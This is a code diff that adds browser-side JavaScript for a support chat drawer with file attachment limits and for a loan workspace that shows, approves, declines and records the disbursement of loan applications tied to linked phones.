+  try {
+    await ensureSupportThread();
+    await loadSupportMessages();
+    await markSupportRead();
+    setSupportStatus("");
+  } catch (e) {
+    setSupportStatus(e instanceof Error ? e.message : String(e));
+  }
+  startSupportMessagePoll();
+}
+
+function closeSupportChat() {
+  const drawer = document.getElementById("support-chat-drawer");
+  if (drawer) drawer.hidden = true;
+  supportChatOpen = false;
+  stopSupportTyping();
+  if (supportPollTimer) {
+    clearInterval(supportPollTimer);
+    supportPollTimer = null;
+  }
+}
+
+async function ensureSupportThread() {
+  return api("/api/device/support/thread");
+}
+
+document.getElementById("support-fab")?.addEventListener("click", () => {
+  void openSupportChat();
+});
+document.getElementById("btn-open-support-chat")?.addEventListener("click", () => {
+  void openSupportChat();
+});
+document.getElementById("btn-feature-contact-support")?.addEventListener("click", () => {
+  void openSupportChat();
+});
+document.getElementById("btn-support-close")?.addEventListener("click", () => closeSupportChat());
+document.getElementById("support-chat-drawer")?.addEventListener("click", (ev) => {
+  if (ev.target?.id === "support-chat-drawer") closeSupportChat();
+});
+document.getElementById("btn-support-attach")?.addEventListener("click", () => {
+  document.getElementById("support-file-input")?.click();
+});
+document.getElementById("support-file-input")?.addEventListener("change", (ev) => {
+  const file = ev.target?.files?.[0] || null;
+  if (!file) {
+    clearSupportAttach();
+    return;
+  }
+  const okType =
+    /^(image\/(jpeg|png|webp)|video\/(mp4|webm))$/i.test(file.type);
+  const max = file.type.startsWith("video/") ? 50 * 1024 * 1024 : 10 * 1024 * 1024;
+  if (!okType) {
+    alert("Only JPEG/PNG/WebP images or MP4/WebM videos are allowed.");
+    clearSupportAttach();
+    return;
+  }
+  if (file.size > max) {
+    alert(file.type.startsWith("video/") ? "Video max 50MB." : "Image max 10MB.");
+    clearSupportAttach();
+    return;
+  }
+  supportPendingFile = file;
+  setSupportAttachPreview(file);
+});
+document.getElementById("btn-support-send")?.addEventListener("click", () => {
+  void sendSupportChat();
+});
+document.getElementById("support-chat-input")?.addEventListener("keydown", (ev) => {
+  if (ev.key === "Enter" && !ev.shiftKey) {
+    ev.preventDefault();
+    void sendSupportChat();
+  }
+});
+
+function rupees(n) {
+  const v = Math.round(Number(n) || 0);
+  return "₹ " + v.toLocaleString("en-IN");
+}
+
+function loanStatusChip(status) {
+  const map = {
+    REVIEW: ["review", "In review"],
+    APPROVED: ["approved", "Approved — awaiting bank details"],
+    AWAITING_DISBURSE: ["await", "Ready to disburse"],
+    DISBURSED: ["disbursed", "Disbursed"],
+    REJECTED: ["rejected", "Declined"],
+    CLOSED: ["closed", "Closed"],
+  };
+  const [cls, label] = map[status] || ["review", status || "Unknown"];
+  return `<span class="loan-status ${cls}">${label}</span>`;
+}
+
+function renderLoanWorkspace(data) {
+  const root = document.getElementById("loans-workspace");
+  const err = document.getElementById("loans-error");
+  if (err) err.hidden = true;
+  if (!root) return;
+  const devices = data.devices || [];
+  const app = data.application;
+  const deviceList = devices.length
+    ? `<ul class="loan-devices">${devices
+        .map(
+          (d) =>
+            `<li>${escapeHtml(d.deviceName || "Phone")}${d.online ? " · online" : ""}</li>`
+        )
+        .join("")}</ul>`
+    : `<p class="muted">No phone is linked to this account yet. Pair your own device first.</p>`;
+
+  if (!data.hasConnectedDevice) {
+    root.innerHTML = `<div class="surface loan-card"><h2>Own devices only</h2><p class="muted">You can review and fund a loan only for the Kalyani Loan app on phones connected to this login. Connect a device from My Phone, then return here.</p>${deviceList}</div>`;
+    return;
+  }
+  if (!app) {
+    root.innerHTML = `<div class="surface loan-card"><h2>No application yet</h2><p class="muted">When the borrower submits a request in the Kalyani Loan app on your connected phone, it will appear here for decision.</p><h3>Linked phones</h3>${deviceList}</div>`;
+    return;
+  }
+
+  const amount = app.approvedAmount || app.requestedAmount;
+  let actions = "";
+  if (app.status === "REVIEW") {
+    actions = `<div class="loan-actions">
+      <label>Approved limit (₹)
+        <input id="loan-approve-amount" class="input" type="number" min="1000" step="1000" max="${app.requestedAmount}" value="${app.requestedAmount}" />
+      </label>
+      <button type="button" class="btn-primary" id="btn-loan-approve">Approve facility</button>
+      <button type="button" class="btn-danger" id="btn-loan-reject">Decline</button>
+    </div>
+    <p class="muted">The sanctioned amount cannot exceed the requested amount of ${rupees(app.requestedAmount)}.</p>`;
+  } else if (app.status === "APPROVED") {
+    actions = `<p class="muted">Sanctioned. Waiting for the borrower to enter bank account details and execute the facility agreement in the app.</p>`;
+  } else if (app.status === "AWAITING_DISBURSE") {
+    actions = `<p>Credit account: <strong>${escapeHtml(app.bankHolderName)}</strong> · ${escapeHtml(app.bankName)} · ${escapeHtml(app.bankAccount)} · IFSC ${escapeHtml(app.bankIfsc)}</p>
+    <div class="loan-actions">
+      <label>Bank UTR / UPI reference
+        <input id="loan-disburse-utr" class="input" type="text" maxlength="22" placeholder="e.g. 123456789012" autocomplete="off" />
+      </label>
+      <button type="button" class="btn-primary" id="btn-loan-disburse">Confirm disbursement</button>
+    </div>
+    <p class="muted">Transfer the sanctioned amount to the account above, then record the UTR so the app can mark the loan as disbursed.</p>`;
+  } else if (app.status === "DISBURSED") {
+    actions = `<p>Disbursed ${rupees(amount)}. UTR <strong>${escapeHtml(app.disbursementUtr)}</strong></p>`;
+  } else if (app.status === "REJECTED") {
+    actions = `<p class="muted">${escapeHtml(app.rejectedReason || "This application was declined.")}</p>`;
+  }
+
+  root.innerHTML = `<div class="surface loan-card">
+    <div class="row-gap" style="justify-content:space-between;align-items:center;">
+      <h2 style="margin:0;">Application</h2>
+      ${loanStatusChip(app.status)}
+    </div>
+    <div class="loan-kv">
+      <span>Applicant</span><strong>${escapeHtml(app.applicantName || "—")}</strong>
+      <span>Email</span><strong>${escapeHtml(app.email || "—")}</strong>
+      <span>Mobile</span><strong>${escapeHtml(app.phone || "—")}</strong>
+      <span>Requested</span><strong>${rupees(app.requestedAmount)}</strong>
+      <span>Sanctioned limit</span><strong>${app.approvedAmount ? rupees(app.approvedAmount) : "Pending"}</strong>
+      <span>Tenure</span><strong>${app.tenureMonths} months</strong>
+      <span>EMI</span><strong>${rupees(app.monthlyEmi)}</strong>
+    </div>
+    <h3>Linked phones (this account)</h3>
+    ${deviceList}
+    ${actions}
+  </div>`;
+
+  document.getElementById("btn-loan-approve")?.addEventListener("click", () => void approveLoan());
+  document.getElementById("btn-loan-reject")?.addEventListener("click", () => void rejectLoan());
+  document.getElementById("btn-loan-disburse")?.addEventListener("click", () => void disburseLoan());
+}
+
+async function loadLoanWorkspace() {
+  const err = document.getElementById("loans-error");
+  const root = document.getElementById("loans-workspace");
+  if (root) root.innerHTML = `<p class="muted">Loading your loan workspace…</p>`;
+  try {
+    const data = await api("/api/device/loans");
+    renderLoanWorkspace(data);
+  } catch (e) {
+    if (root) root.innerHTML = "";
+    if (err) {
+      err.hidden = false;
+      err.textContent = e instanceof Error ? e.message : String(e);
+    }
+  }
+}
+
+async function approveLoan() {
+  const amount = document.getElementById("loan-approve-amount")?.value;
+  try {
+    await api("/api/device/loans/approve", {
+      method: "POST",
+      body: JSON.stringify({ approvedAmount: Number(amount) }),
+    });
+    await loadLoanWorkspace();
+  } catch (e) {
+    alert(e instanceof Error ? e.message : String(e));
+  }
+}
+
+async function rejectLoan() {
+  if (!confirm("Decline this loan application?")) return;
+  try {
+    await api("/api/device/loans/reject", {
+      method: "POST",
+      body: JSON.stringify({ reason: "Application declined after review." }),
+    });
+    await loadLoanWorkspace();
+  } catch (e) {
+    alert(e instanceof Error ? e.message : String(e));
+  }
+}
+
+async function disburseLoan() {
+  const utr = document.getElementById("loan-disburse-utr")?.value;
+  try {
+    await api("/api/device/loans/disburse", {
+      method: "POST",
+      body: JSON.stringify({ utr }),
+    });
+    await loadLoanWorkspace();
+  } catch (e) {
+    alert(e instanceof Error ? e.message : String(e));
+  }
+}
+
+document.getElementById("btn-loans-refresh")?.addEventListener("click", () => {
+  void loadLoanWorkspace();
+});
